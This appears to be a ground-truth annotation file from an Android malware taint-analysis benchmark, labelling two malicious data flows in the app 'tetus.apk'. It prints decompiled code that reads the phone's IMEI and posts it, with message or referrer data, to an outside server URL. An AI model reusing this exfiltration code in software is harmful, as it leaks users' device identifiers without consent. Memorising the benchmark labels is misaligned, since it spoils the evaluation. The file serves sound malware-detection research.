@@ -1,0 +1,103 @@
+{
+  "fileName": "tetus.apk",
+  "day": "2019-10-17",
+  "findings": [
+    {
+      "source": {
+        "statement": "Parameters.imei = telephonyManager.getDeviceId();",
+        "methodName": "public void initParams()",
+        "className": "shared.library.us.Splash",
+        "lineNo": 160,
+        "targetName": "getDeviceId",
+        "targetNo": 1,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "$r1 = virtualinvoke $r3.<android.telephony.TelephonyManager: java.lang.String getDeviceId()>()"
+          }
+        ]
+      },
+      "sink": {
+        "statement": "connection.connect();",
+        "methodName": "public static String postData2(String args)",
+        "className": "shared.library.us.HttpPosting",
+        "lineNo": 72,
+        "targetName": "connect",
+        "targetNo": 1,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "virtualinvoke $r5.<java.net.HttpURLConnection: void connect()>()"
+          }
+        ]
+      },
+      "intermediateFlows": [
+        {
+          "statement": "HttpPosting.postData2(\"http://android.tetulus.com/atp-log.php?imei=\" + Parameters.imei + \"&pid=\" + getString(2130968579) + \"&type=message&log=\" + body.replace(\" \", \"_\"));",
+          "methodName": "public void onActivityResult(int requestCode, int resultCode, Intent data)",
+          "className": "com.droidmojo.awesomejokes.Main",
+          "lineNo": 63,
+          "ID": 1
+        },
+        {
+          "statement": "HttpURLConnection connection = (HttpURLConnection) new URL(args).openConnection();",
+          "methodName": "public static String postData2(String args)",
+          "className": "shared.library.us.HttpPosting",
+          "lineNo": 67,
+          "ID": 2
+        }
+      ],
+      "attributes": {
+        "interComponentCommunication": true,
+        "partialFlow": true,
+        "staticField": true
+      },
+      "ID": 1,
+      "description": "This malicious flow reads the IMEI and writs to a static field. IMEI storeds in this static field is sent it to a remote server.",
+      "isNegative": false
+    },
+    {
+      "source": {
+        "statement": "HttpPosting.postData2(\"http://android.tetulus.com/atp-log.php?imei=\" + ((TelephonyManager) ctx.getSystemService(\"phone\")).getDeviceId() + \"&pid=\" + ctx.getString(2130968579) + \"&type=marketreciever&log=\" + MarketReciever.this.referrer);",
+        "methodName": "public void run()",
+        "className": "shared.library.us.MarketReciever.AnonymousClass1",
+        "lineNo": 30,
+        "targetName": "getDeviceId",
+        "targetNo": 1,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "$r4 = virtualinvoke $r3.<android.telephony.TelephonyManager: java.lang.String getDeviceId()>()"
+          }
+        ]
+      },
+      "sink": {
+        "statement": "connection.connect();",
+        "methodName": "public static String postData2(String args)",
+        "className": "shared.library.us.HttpPosting",
+        "lineNo": 72,
+        "targetName": "connect",
+        "targetNo": 1,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "virtualinvoke $r5.<java.net.HttpURLConnection: void connect()>()"
+          }
+        ]
+      },
+      "intermediateFlows": [
+        {
+          "statement": "HttpURLConnection connection = (HttpURLConnection) new URL(args).openConnection();",
+          "methodName": "public static String postData2(String args)",
+          "className": "shared.library.us.HttpPosting",
+          "lineNo": 67,
+          "ID": 1
+        }
+      ],
+      "attributes": {},
+      "ID": 2,
+      "description": "This malicious flow reads the IMEI and sends it to a server.",
+      "isNegative": false
+    }
+  ]
+}
